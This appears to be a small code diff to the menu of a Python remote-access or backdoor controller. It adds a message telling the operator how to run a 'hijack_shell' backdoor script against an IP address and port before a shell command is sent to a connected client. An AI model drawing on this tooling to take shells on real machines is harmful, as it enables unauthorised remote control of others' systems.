@@ -119,7 +119,10 @@ def main_menu():
                     continue                # go to main menu
 
                 client_conn, cl_name    = choose_client()
-                if cmd.type == 'take_shell': 
+                if cmd.type == 'take_shell':
+                    print("""\nto run this backdoor you have to run 
+"python ./hijack_shell <IP address> <PORT>"\n
+when you finish - enter "q" as for quit  """)
                     send_msg(client_conn, cmd)
                     # time.sleep(1)
                     # ip              = cl_name[1]
